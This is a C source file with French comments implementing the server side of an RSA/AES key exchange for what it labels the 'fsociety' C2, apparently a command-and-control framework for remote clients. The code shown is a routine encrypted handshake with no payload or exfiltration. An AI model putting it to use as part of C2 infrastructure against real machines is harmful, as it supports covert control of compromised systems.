#include "handshake.h"
#include "protocol.h"
#include "crypto_common.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
 * fsociety — Échange de clé (côté C2)
 * ============================================================ */

int fso_handshake(fso_server_t *srv, int client_idx,
                  uint8_t *aes_key_out)
{
    if (!srv || !aes_key_out) return -1;

    uint8_t buf[2048];
    ssize_t n = fso_server_recv(srv, client_idx, buf, sizeof(buf));
    if (n <= 0) {
        fprintf(stderr, "[-] MSG_KEYX non reçu\n");
        return -1;
    }

    /* Unpack. */
    fso_header_t header;
    const uint8_t *payload;
    if (fso_unpack(buf, (size_t)n, &header, &payload) != 0) {
        fprintf(stderr, "[-] fso_unpack échoué\n");
        return -1;
    }

    if (header.type != MSG_KEYX) {
        fprintf(stderr, "[-] Type inattendu : 0x%02X (attendu 0x%02X)\n",
                header.type, MSG_KEYX);
        return -1;
    }

    printf("[*] MSG_KEYX reçu (%u octets DER)\n", header.length);

    /* Génère une clé AES. */
    uint8_t aes_key[FSO_KEY_SIZE];
    if (fso_aes_generate_key(aes_key) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Génération clé AES échouée\n");
        return -1;
    }

    /* Chiffre la clé AES avec la clé publique RSA (DER). */
    uint8_t encrypted[512];
    size_t enc_len = sizeof(encrypted);

    if (fso_rsa_encrypt(payload, header.length,
                        aes_key, FSO_KEY_SIZE,
                        encrypted, &enc_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Chiffrement RSA échoué\n");
        return -1;
    }

    printf("[+] Clé AES chiffrée (%zu octets)\n", enc_len);

    /* Pack MSG_AUTH. */
    uint8_t packet[1024];
    int packet_len = fso_pack(MSG_AUTH, 0,
                              encrypted, (uint32_t)enc_len,
                              packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "[-] fso_pack échoué\n");
        return -1;
    }

    /* Envoi. */
    if (fso_server_send(srv, client_idx, packet, (size_t)packet_len) < 0) {
        fprintf(stderr, "[-] Envoi MSG_AUTH échoué\n");
        return -1;
    }

    printf("[+] MSG_AUTH envoyé (%d octets)\n", packet_len);

    /* Copie la clé AES dans la sortie. */
    memcpy(aes_key_out, aes_key, FSO_KEY_SIZE);

    return 0;
}